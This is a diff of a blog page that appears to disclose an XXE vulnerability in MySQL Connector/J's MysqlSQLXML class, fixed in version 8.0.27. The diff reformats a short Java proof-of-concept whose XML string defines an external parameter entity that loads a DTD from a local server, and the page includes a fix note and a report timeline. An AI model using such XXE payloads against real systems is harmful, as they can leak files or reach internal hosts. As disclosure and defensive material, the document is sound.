@@ -159,8 +159,18 @@
 <p>Unfortunately, there is no any security check when a new instance created. So we can construct a XML with external entities.<br><img src="/images/pasted-4.png" alt="upload successful"></p>
 <p>However, from MySQL Connector/J 8.0.27, security attributes are set up to check XML sources before the object instantiated.<br><img src="/images/pasted-1.png" alt="upload successful"></p>
 <p><img src="/images/pasted-6.png" alt="upload successful"></p>
-<h5 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h5><p>``<br>import com.mysql.cj.jdbc.MysqlSQLXML;<br>import javax.xml.transform.dom.DOMSource;<br>import java.sql.SQLException;</p>
-<p>public class MySQLDemo {<br>    public static void main(String[] args) throws SQLException {<br>        MysqlSQLXML myXML = new MysqlSQLXML(null);<br>        myXML.setString(“<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://127.0.0.1:8000/test.dtd\"> %xxe;]&gt;”);<br>        myXML.getSource(DOMSource.class);<br>    }<br>}<br>``</p>
+<h5 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h5><pre><code>import com.mysql.cj.jdbc.MysqlSQLXML;
+import javax.xml.transform.dom.DOMSource;
+import java.sql.SQLException;
+
+public class MySQLDemo &#123;
+    public static void main(String[] args) throws SQLException &#123;
+        MysqlSQLXML myXML = new MysqlSQLXML(null);
+        myXML.setString(&quot;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM \&quot;http://127.0.0.1:8000/test.dtd\&quot;&gt; %xxe;]&gt;&quot;);
+        myXML.getSource(DOMSource.class);
+    &#125;
+&#125;
+</code></pre>
 <h5 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h5><p>In line with good XML practices, the getSource() method of MysqlSQLXML no longer supports external DTD, external general entities, and external general parameters in XML sources. </p>
 <h5 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h5><ul>
 <li><p>2021/07/10 Report to Oracle</p>
